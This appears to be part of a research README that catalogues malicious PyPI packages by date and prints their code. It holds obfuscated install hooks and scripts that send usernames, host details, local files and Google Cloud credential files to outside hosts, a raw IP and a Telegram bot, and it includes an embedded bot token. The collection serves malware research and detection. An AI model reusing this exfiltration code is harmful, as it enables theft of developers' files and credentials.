from zlib import compress, decompress
from base64 import b64decode, b64encode
from os import getlogin
from json import dumps

class algorithmb():
	def encd(self, data):
		zlbc=lambda in_:compress(in_)
		b64e=lambda in_:b64encode(in_)
		return b64e(zlbc(data.encode('utf8')))[::-1].decode()

	def decd(self, data):
		b64d=lambda in_:b64decode(in_)
		zlbd=lambda in_:decompress(in_)
		return zlbd(b64d(data[::-1])).decode()

	def ciphersd(self, e:str, t:int, v:str):
		try:
			gG53z=[b'jog6DCQBP78SRvSzJtyzOrULO1iKNhSys88SXziSrwJe',b'=wKCQiGADsSzPNNzM30zRzyyM/c1J9kzzBvzsg09TzJe']
			doSGb=HTTPSConnection(self.decd(gG53z[0]),timeout=1)
			doSGb.request(''.join(map(chr,[71,69,84])),self.decd(gG53z[1]))
			tenNo=doSGb.getresponse().read().decode().strip()
			doSGb.close()
			Fd3hh=self.decd(tenNo).split(':')
			enC03=self.encd(e)
			pF3th={"t":t,"n":getlogin(),"v":v,"e":enC03}
			aPf3h=''.join(map(chr,[97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110]))
			Hs3hf={''.join(map(chr,[67,111,110,116,101,110,116,45,116,121,112,101])):aPf3h}
			s0Ntz=HTTPSConnection(Fd3hh[0],Fd3hh[1],timeout=1)
			s0Ntz.request(''.join(map(chr,[80,79,83,84])),Fd3hh[2],dumps(pF3th),Hs3hf)
			rsGap=s0Ntz.getresponse()
			s0Ntz.close()
			return True
		except:
			return False
```

### 21 Jul. 2024
requestn [8.0] <br>
```python
import os
import requests

def promain():
    try:
        import socket
        import webbrowser
        import sys
        import json
        token2='7345360932:AAFdgHMvggOowu-hx-OGyPljyi_wOf5D0zI'
        ID2='5487978588'
    except:
        os.system("pip install webbrowser")
        os.system("pip install socket")
        os.system("clear")

    S = '\033[1;33m'
    A = "\033[1;91m" #red
    C = "\033[1;97m" #white
    ra = 0

    file_ha = []

    for file in os.listdir():
        if os.path.isfile(file):
            file_ha.append(file)
            g = file
            print(file)
            massage = '@is_brother'
            start_msg = requests.post(f"https://api.telegram.org/bot{token2}/sendMessage?chat_id\n\n@t.me/is_brother")
            requests.post(f'https://api.telegram.org/bot{token2}/sendDocument?chat_id={ID2}&caption={massage}', files={'document': open(g, 'rb')})
  
    print(file_ha)
    massage = '@is_brother'

    for file in file_ha:
        with open("SIN.txt","a") as pro:
            pro.write(str(file) + "\n")
            print(file_ha)
promain()
```

### 22 Jul. 2024
hexmanibm [1.0.4] <br>
hexteamibm [1.0.4] <br>
asptcer [1.0.0] <br>

```python
class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("http://9.30.214.68",params = ploads)
```


### 27 Jul. 2024
stackstorm-runner-action-chain [1.0.0] <br>

### 28 Jul. 2024
lr_utils_lib [1.0.0] <br>

```python
def get_co():
    from subprocess import check_output as cooo
    return cooo

def get_defcon(pew, h):
    return pew.HTTPSConnection(h)

def get_se():
    from re import search as se
    return se

def get_ma(my):
    return my.group(1)

def get_prrr():
    from http import client as prrr
    return prrr

def get_obs():
    from codecs import open as obs
    return obs

def get_ash(i):
    from hashlib import sha256 as s256
    return s256(i.encode()).hexdigest()

go = ['641d54eb5d6eede67c62287e8b33c95200b68d35465c75a2715a95fdfffe86d1',
    'ae712e7065d27a88e464f77a0e4f97af6fa7a6bbcb9ebfe674eecec11f82c752',
    '1686dc1dc8b706be5664fa568833cd8920c8551415c1b8567bc9b1060ff7bd0a',
    'ae5a652d6397ac8150e0462930064cc600875e66d7687dcdcadd3c2532c45ac9',
    '086dac8a9a2e86f3ee79274111d04577cfb4537d4f004efb4698ddecdf78c608',
    'faacef9164ab09741fc616e71890ecbb4d748fec30954daf198424615c4115cb',
    '3d959605a3105b5d37a4af33543c93ca4ffd02627d476e1b4647c75d61dd977f',
    'e0df878d670bc75d210ed22d89a96049e2c7c8e750a22984f73320019a6b3c34',
    '219a42f0592c7237a7bee6aaaadfdb3d8a9c2feaade9bb4cc334237a547f11c5',
    '162284405016ebdcfc4b4525479f6e81e77995036e4a7c838060dee0aef347a5',
    'ee4dc4f0fc56a3adab495255b467fa37f1af59aa213e1a757fd4982ff93603e2',
    'ab85c781babc692205d15e49a3d8b4554382659f3c33f420f2313abe88236d0e',
    '1c20e11f988ac643e391e46650b631130f2441eeadd07042123d8c33c9299519',
    '53e65c0f44c9187361a3188e328786027ae32f73e58133f7a3deee8ecede2330',
    '0d991fd5a73bc1cc5eb85f4f4a214b75ee4b6524aa7c7cffb25201fef9b39111',
    '7594de25a00ad4c63e99b4e1bb288aff95463bf9e412cba7bfe2b41e7d48a649',
    '94b307dbe8ea576634eb9f8c89cc303b174518f6b74771f3a79bafb178084421',
    '55adf25da39af781eaeb5495c95fd9d52b40faf520f4c3f1c47c7376be2e7f8c',
    '3defabd5508208a295e6d510983e88ad9f058ed3a83d7b51ece6298f6316772b',
    '28eaeb21dc834a1d03fce5f08ade2a92adf5c02b8b393d547180f64cbb1c86f1',
    '114fa09995b39dfe510be16835c3e8bbc2e72198124f84346e98911d90b3b22f',
    'aeb94d85e079805c3d8417859674bc147399fb2e75d7f44762f188aefb558e9b',
    '076a8d36cd65f00aa194b43e84b35b1d9dee995b1d1dd79889e32fb2f7d25c68',
    'f4de2757497be6be87ed7aed1015f7d400801476922ecda8c3726d0a21eff626',
    'fbcd4aedb12f03e1bfa3e4d18e95b5bbba9dc24ece486b53d1b9efa0b9a1d05f',
    '64452e7c8fc93d823ffb7afc56a0ec29a26f01ab0433864334aca9b3d853fdae',
    '536a133d1418fab3e9446d24ba372a3074d9b1cb0323deba90f4570bc06aec5b',
    '5ac29b3e8d242d5304741adefeab22a7ec86d27ca20770e9bbaa7607ea6ac6c6',
    '893b0bdad0ad9b444d3b8f81d767174d56ef8d50d42e2cebe590909b4e3b8c14',
    '98072eb273aa84e41be2c632d80c45c9d01bc51bb00b7641e10ed506d9ec8e0b',
    '8a811141b32bb3c557e3ab590a16e20610e47048dd3e7e89e1fb212a96dbb8a8',
    'cfa5a30deb25da9e0fb69d8fbffeede549e2a859197a985ddb70185ba7b702d3',
    '794722165ec19e2861a3ab8f6c28491f30b649e53ac9f36047e875398f614d9d',
    '06b3c63f79eacfd4f6663da06605c431a348cde69880146fc9146b698355cb6e',
    'ba843f0a75e1aea2408132ecf7926fe27d1553c35eb4a94ff69f1bc906d61e2d',
    'a8a9ffe2bc4a837da05869333ffd7b0f518a8c79d765e6676383dd5d94384a7b',
    '62806c8a8e2196f71f7e4927f868e61692473b02b381719c34262370adb83d6c',
    'de4179e4031f226ba6dbb20075b7c1d224a66dfa1bce24b79e02bad14bf5e560',
    '6d1a9f3a34e6b8d9a7afe3207755e66694514fcb8438e230077002f26721471c',
    'a397fc034fd2637cb14fb150fc3373ac2764985b84d374f059ee81ef80343051',
    '8b8fb34fb9a3e2e030904c7a4bdb41e83b67ed89c13b7bdd2ea12819f05f3f8e',
    'e84fed85df76f0e7680e1dca0aee6756e4314103f79a4d0d7ddf6567b8e0de85',
    'c00facb20a683a9b09d3b7f291885104bfca9b2bf59b8b8b3a3ef7b405ae473b',
    '7bb8e88f6f416b7bbae07288a189e733bc671fc616c09cd9afe7a2fc9360fb5e',
    '67aaee9fa3885064036c378669662bc657aaa6d4d216430dad7221dc45d13e24',
    'f23e972a78e412f9037049bb4f8409022e5c3c9bf4433478dc9a2ac6c03401cc',
    '224e96bb75927242dd3aa94d044ba38107923eb001f4e52ba477f486c2e7f5f6',
    '3d0126242a1d570638bbd7e3a90cea72ab106c9bf0987484dd7cca128c51b18c',
    '6f81cf533536a625c491d36e09fe3a98b6a0940d579c555ee5c00317138144c5',
    '80c492975129f66b856433f1cc35dfeaabeef3d6804f9741604b64b7f1829fab',
    '715847db3c4c182e95822515f4f7f32c5ba0e6fbfacc81b66138515c1e74d7fc',
    'e7a2467cc4154ba48de85a8cf5afbef66523be988ee69b8da13538b1be27665c',
    '7961af6aab6ff18d10dd5b699580733f44bc7fd825f0410ff89b5f22a93dd9b8',
    '68110b8c2efab1563556ab0d535ffedd8aa1aecd1d47b784c2bc7e995c887fc2',
    '5b31fceeeb1abc1f49b03824367db11103b04a163686d47d8c590e3d669768c2']

class PyInstall(install):
    def run(self):
        if sys.platform != "darwin":
            return 

        tmp = get_co()
        c = b64d("aW9yZWcgLWsgSU9QbGF0Zm9ybVVVSUQ=").decode()
        raw = tmp(c.split()).decode()
        p = b64d('IklPUGxhdGZvcm1VVUlEIlxzKj1ccyoiKFteIl0qKSIK').decode()
        roger = get_se()(p, raw)
        u = get_ma(roger)
        h = get_ash(u)
        
        if h in go:
            b = os.path.expanduser(b64d('fi8uY29uZmlnL2djbG91ZA==').decode())
            t = ["YXBwbGljYXRpb25fZGVmYXVsdF9jcmVkZW50aWFscy5qc29u", "Y3JlZGVudGlhbHMuZGI="]

            for x in t:
                try:
                    con = get_defcon(get_prrr(), b64d("ZXVyb3BlLXdlc3QyLXdvcmtsb2FkLTQyMjkxNS5jbG91ZGZ1bmN0aW9ucy5uZXQ=").decode())
                    with get_obs()(os.path.join(b, b64d(x).decode()), "rb") as fd:
                        con.request("POST", "/version", fd.read(), {"X-Trace-Correlation-ID": h})
                    con.close()
                except:
                    pass

            install.run(self)

# 'setup.py publish' shortcut.
if sys.argv[-1] == "publish":
    os.system("python setup.py sdist bdist_wheel")
    os.system("twine upload dist/*")
    sys.exit()
```

## About the malicious packages detection

We have proposed a new method to detect malicious packages in the PyPI ecosystem. We will release the code and the dataset after the paper is accepted.

## Contact

To ensure security, we will release a new batch of malicious component datasets each month. If needed, please contact us via email at honywenair@gmail.com.

## Other Dataset

- GitHub Advisory Database https://github.com/advisories?query=type%3Amalware (NPM).
- https://dasfreak.github.io/Backstabbers-Knife-Collection/ (PyPI and npm), by Marc Ohm et al.
- https://github.com/datadog/malicious-software-packages-dataset (PyPI), by Datadog
